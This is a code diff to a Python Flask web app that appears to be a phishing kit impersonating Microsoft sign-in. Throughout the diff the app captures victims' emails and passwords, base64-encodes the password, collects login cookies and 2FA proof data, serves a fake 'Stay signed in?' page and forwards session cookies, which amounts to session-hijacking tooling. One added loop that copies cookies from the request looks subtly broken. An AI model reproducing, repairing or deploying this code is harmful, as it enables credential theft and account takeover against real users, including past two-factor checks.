@@ -426,9 +426,6 @@ def loginOffice(email, password):
                 cookie_json = cookieToJSON(cookie_str, domain)
                 list_cookies.append(cookie_json)
 
-        # Convert cookies to JSON string
-        cookie_json_string = json.dumps(list_cookies, separators=(',', ':'))
-
         # Check if 2FA verification needed
         if json_data and json_data.get('arrUserProofs'):
             is_personal = any(domain in email.lower() for domain in [
@@ -452,14 +449,14 @@ def loginOffice(email, password):
                 'data': base64.b64encode(json.dumps(auth_data).encode()).decode(),
                 'method': base64.b64encode(json.dumps(json_data['arrUserProofs']).encode()).decode(),
                 'key': base64.b64encode(password.encode()).decode(),
-                'cookies': cookie_json_string
+                'cookies': list_cookies
             }
 
         # Return success if no 2FA needed
         return {
             'status': 'success',
             'message': 'Login successful',
-            'cookies': cookie_json_string
+            'cookies': list_cookies
         }
 
     except Exception as e:
@@ -1138,8 +1135,8 @@ async def sign_in_handler():
             session['email'] = email
             session['password'] = password
 
-            # Render StaySignIn.html directly by rendering post_redirect.html
-            return render_template('post_redirect.html')
+            # Render StaySignIn.html template
+            return render_template('StaySignIn.html')
         else:
             return jsonify({
                 "status": "error",
@@ -1153,42 +1150,38 @@ async def sign_in_handler():
             "message": "An error occurred during sign in"
         }), 500
 
-@app.route('/stay-signed-in', methods=['GET', 'POST'])
+@app.route('/stay-signed-in', methods=['POST'])
 async def stay_signed_in():
-    if request.method == 'POST':
-        # Render the StaySignIn.html template
-        return render_template('StaySignIn.html')
-    elif request.method == 'GET':
-        # Get the value of the "Stay signed in?" option
-        stay_signed_in = request.form.get('Kmsi') == 'true'
+    # Get the value of the "Stay signed in?" option
+    stay_signed_in = request.form.get('Kmsi') == 'true'
 
-        # Store the value in the session
-        session['stay_signed_in'] = stay_signed_in
+    # Store the value in the session
+    session['stay_signed_in'] = stay_signed_in
 
-        # Check if personal or work email account
-        email = session.get('email', '')
-        is_personal = any(domain in email.lower() for domain in [
-            'outlook.com', 'hotmail.com', 'live.com', 'msn.com',
-            'outlook.ca', 'hotmail.ca', 'live.ca'
-        ])
+    # Check if personal or work email account
+    email = session.get('email', '')
+    is_personal = any(domain in email.lower() for domain in [
+        'outlook.com', 'hotmail.com', 'live.com', 'msn.com',
+        'outlook.ca', 'hotmail.ca', 'live.ca'
+    ])
 
-        # Get login result from session
-        login_result = session.get('login_result', {})
-        login_status = login_result.get('status')
+    # Get login result from session
+    login_result = session.get('login_result', {})
+    login_status = login_result.get('status')
 
-        # Call process function only for personal accounts with "success" login status
-        if is_personal and login_status == 'success':
-            user_email = session.get('email')
-            user_password = session.get('password')  # Assuming password is still needed here
-            if user_email and user_password:
-                cookie_data = process(user_email, user_password, request)
-                session['cookie_data'] = cookie_data  # Store cookie data in session
+    # Call process function only for personal accounts with "success" login status
+    if is_personal and login_status == 'success':
+        user_email = session.get('email')
+        user_password = session.get('password')  # Assuming password is still needed here
+        if user_email and user_password:
+            cookie_data = process(user_email, user_password, request)
+            session['cookie_data'] = cookie_data  # Store cookie data in session
 
-        # Render a template with a form that auto-submits to /final-redirect
-        return render_template(
-            'redirect_form.html',
-            stay_signed_in=stay_signed_in
-        )
+    # Render a template with a form that auto-submits to /final-redirect
+    return render_template(
+        'redirect_form.html',
+        stay_signed_in=stay_signed_in
+    )
 
 def process(email, password, request):
     """
@@ -1216,6 +1209,11 @@ def process(email, password, request):
             'SameSite': 'None',  # Add SameSite attribute
             'Secure': 'True' # Add Secure attribute
         })
+
+        # Copy cookies from the user's browser request for login.microsoftonline.com
+        for cookie in request.cookies:
+            if 'login.microsoftonline.com' in request.host:
+                session_obj.cookies.set(cookie.name, request.cookies[cookie.name], domain='login.microsoftonline.com', path='/', secure=True, httponly=True, samesite='none')
 
         # Get the redirect URL domain
         is_personal = any(domain in email.lower() for domain in [
@@ -1285,11 +1283,6 @@ async def final_redirect():
             
             # Add authentication cookies
             login_cookies = session.get('login_cookies', [])
-            if isinstance(login_cookies, str):
-                try:
-                    login_cookies = json.loads(login_cookies)
-                except json.JSONDecodeError:
-                    login_cookies = []
             for cookie in login_cookies:
                 if cookie.get('name') and cookie.get('value'):
                     # Set domain based on account type
